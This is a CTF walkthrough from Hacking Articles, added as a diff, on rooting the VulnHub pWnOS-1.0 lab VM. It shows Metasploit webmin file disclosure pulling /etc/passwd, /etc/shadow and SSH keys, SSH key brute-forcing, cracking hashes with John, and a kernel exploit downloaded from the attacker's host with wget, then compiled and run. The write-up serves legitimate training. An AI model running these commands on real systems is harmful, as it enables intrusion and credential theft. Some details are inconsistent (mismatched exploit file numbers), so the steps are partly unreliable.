@@ -1,0 +1,88 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the pWnOS-1.0 (Boot To Root)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-pwnos-1-0-boot-to-root/" rel="bookmark"><time class="entry-date published" datetime="2016-07-08T17:25:17+00:00">July 8, 2016</time><time class="updated" datetime="2025-06-10T20:13:19+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “pWnOS-1.0” of the vulnhub labs. The level of this challenge is not so tough and its difficulty level is described as beginner/intermediate. You can download it from here<span style="color: #0000ff;"> <a style="color: #0000ff;" href="https://www.vulnhub.com/entry/pwnos-10,33/">https://www.vulnhub.com/entry/pwnos-10,33/</a></span></span></p>
+<h3><span style="color: #800000;"><strong>Vulnerabilities:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Arbitrary File Disclosure</span></li>
+<li><span style="color: #000000;">Privilege Escalation</span></li>
+<li><span style="color: #000000;">Weak Credentials</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Penetrating Methodologies:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network Scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Exploiting web application (Metasploit)</span></li>
+<li><span style="color: #000000;">Extracting arbitrary file</span></li>
+<li><span style="color: #000000;">1st Method</span></li>
+<li><span style="color: #000000;">SSH Brute-force</span></li>
+<li><span style="color: #000000;">Spawning TTY shell (Via SSH RSA key)</span></li>
+<li><span style="color: #000000;">Kernel Privilege Escalation</span></li>
+<li><span style="color: #000000;">2nd Method</span></li>
+<li><span style="color: #000000;">Cracking password hashes (John the ripper)</span></li>
+<li><span style="color: #000000;">Spawning TTY shell (via SSH login)</span></li>
+<li><span style="color: #000000;">Kernel Privilege Escalation</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
+<p><span style="color: #000000;">Start with the netdiscover command to identify target IP in the local network, in my network 192.168.1.105 is my target IP, you will get yours.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-GVDMSI8kmtM/W1iuu5yqlgI/AAAAAAAAYog/U55u0wnYZ7koWBWCg-0vHXFaH9nPaJ-dgCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Further, let’s enumerate open and protocols information in the target’s network with help of nmap following command:</span></p>
+<pre class="lang:default decode:true">nmap –A 192.168.1.105</pre>
+<p><span style="color: #000000;">From its result, we found port 22 for SSH and 80, 1000 for HTTP are open. Moreover webmin – a web interface is running over port 1000.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p9ewt0RaNo8/W1iuwFKvfXI/AAAAAAAAYow/hEC8Dve5Cw0GvDMegA6dnJwh6Z5C60JEwCEwYBhgL/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">So I check related its exploit inside Metasploit and luckily found it can be exploited by nasty people to disclose potentially sensitive information. So with help of the following command, we execute this exploit to extract /etc/passwd file from inside the victim’s VM.</span></p>
+<pre class="lang:default decode:true">use auxiliary/admin/webmin/file_disclosure
+msf auxiliary(file_disclosure) &gt; set rhost 192.168.1.105
+msf auxiliary(file_disclosure) &gt; exploit</pre>
+<p><span style="color: #000000;">As you can observe we have fetched available username of the victim’s system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YBiUdDzAEqs/W1iuyF_171I/AAAAAAAAYpc/iH3fB6VIE68rulSB64T7wg-z9mcflMwJQCEwYBhgL/s1600/5.png"/></span></p>
+<pre class="lang:default decode:true">msf auxiliary(file_disclosure) &gt; set rpath /etc/shadow
+msf auxiliary(file_disclosure) &gt; exploit</pre>
+<p><span style="color: #000000;">As you can observe we have also fetched a shadow file of the victim’s system which holds password hashes.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-LOmVnyq0U6o/W1iuyIdj19I/AAAAAAAAYpg/xhGiazFPVI4KCzF79LKFnT5oYmtMj2slwCEwYBhgL/s1600/6.png"/></span></p>
+<pre class="lang:default decode:true">msf auxiliary(file_disclosure) &gt; set rpath /home/Obama/.ssh/authorized_keys
+msf auxiliary(file_disclosure) &gt; exploit</pre>
+<p><span style="color: #000000;">As you can observe that we got SSH authorized key and we can also enumerate username from inside the passwd. Now to obtain RSA key of SSH we can apply brute-force attack valid combination of authorized key and RSA key.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-E_Q6kvCxmYY/W1iuycSQjAI/AAAAAAAAYpk/QUy6bOZ3wUYdxobu5kn13dNFrrupfst0QCEwYBhgL/s1600/8.png"/></span></p>
+<h3><span style="color: #800000;"><strong>1st Method to Exploit </strong></span></h3>
+<p><span style="color: #000000;">To do so we downloaded a tar file with help of the following command.</span></p>
+<pre class="lang:default decode:true">wget https://github.com/offensive-security/exploit-database-bin-sploits.git</pre>
+<p><span style="color: #000000;">Then extract the tar file with help of the following command:</span></p>
+<pre class="lang:default decode:true">tar vxjf 5622.tar.bz2</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7isZzaz19wQ/W1iuvOsDgWI/AAAAAAAAYpk/k1CUNMQUXyMW-MIAMx5KDYOsv-UYnDDnwCEwYBhgL/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Move into extract folder and execute following for Grabbing a valid combination of a key.</span></p>
+<pre class="lang:default decode:true">cd rsa
+grep -lr {authorized_key}</pre>
+<p><span style="color: #000000;">Great, we successfully got rsa_key for the authorized key.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7Od0aPtseNA/W1iuv48OW3I/AAAAAAAAYpc/5KDe3-hPj8gp_6q-JsIdbPTiCpfZI6pZwCEwYBhgL/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Let’s login into SSH using above enumerated credential</span></p>
+<pre class="lang:default decode:true">ssh -i 2048/dcbe2a56e8cdea6d17495f6648329ee2-4679.pub obama@192.168.1.105</pre>
+<p><span style="color: #000000;">Yippeeee!! We logged in successfully, let’s find kernel details and then search its exploit.</span></p>
+<pre class="lang:default decode:true">uname -a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y6PihTH4I8E/W1iuwZtqCKI/AAAAAAAAYpU/ZD9CaVr3APUAECK-dE9HKbOSskeBse57ACEwYBhgL/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">So we found C-program file for exploit 5092 inside kali, let’s transfer it into Victim’s machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XMqx23TJxW4/W1iuwbD2lDI/AAAAAAAAYpY/nWNH8UDkAoEuo_alFiGQps8C2dObLQDnACEwYBhgL/s1600/21.png"/></span></p>
+<p><span style="color: #000000;">Inside victim’s shell, we run following to download kernel exploit in his VM and compile it then Got root access on executing</span></p>
+<pre class="lang:default decode:true">cd /tmp
+wget http://192.168.1.107/5902.c
+gcc 5092.c -o shell
+chmod 777 shell
+./shell</pre>
+<p><span style="color: #000000;">Booommm! Here we have Root access.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0GVqm-jJQtM/W1iuxM--XoI/AAAAAAAAYpc/MjelQJrmD2YvEYrsRGUlj3Cf7y34KrOogCEwYBhgL/s1600/22.png"/></span></p>
+<h3><span style="color: #800000;"><strong>2<sup>nd</sup> Method</strong></span></h3>
+<p><span style="color: #000000;">As you have seen that with the help of Metasploit exploit we successfully fetched information of /etc/shadow file. So with the help of John, we can crack the hash password of shadow file.</span></p>
+<pre class="lang:default decode:true">john --wordlist=/usr/share/wordlists/rockyou.txt pass</pre>
+<p><span style="color: #000000;">So we got password h4ckm3 for VMware, let’s use it for SSH login.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-j4Kxfpyt1e4/W1iuxYhCGqI/AAAAAAAAYpY/uJ1Pxzy8ap8PEN9R5VEQvvO1t8HkSgWVQCEwYBhgL/s1600/23.png"/></span></p>
+<pre class="lang:default decode:true">ssh vmware@192.168.1.105</pre>
+<p><span style="color: #000000;">Now repeat above step for root privilege escalation and after exploiting its kernel, you get the root as shown in the image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1oU2z9vqzfc/W1iuxx9X50I/AAAAAAAAYpg/Aatr8eFyO3cXplTe5VVTOYghvEklmxigQCEwYBhgL/s1600/24.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
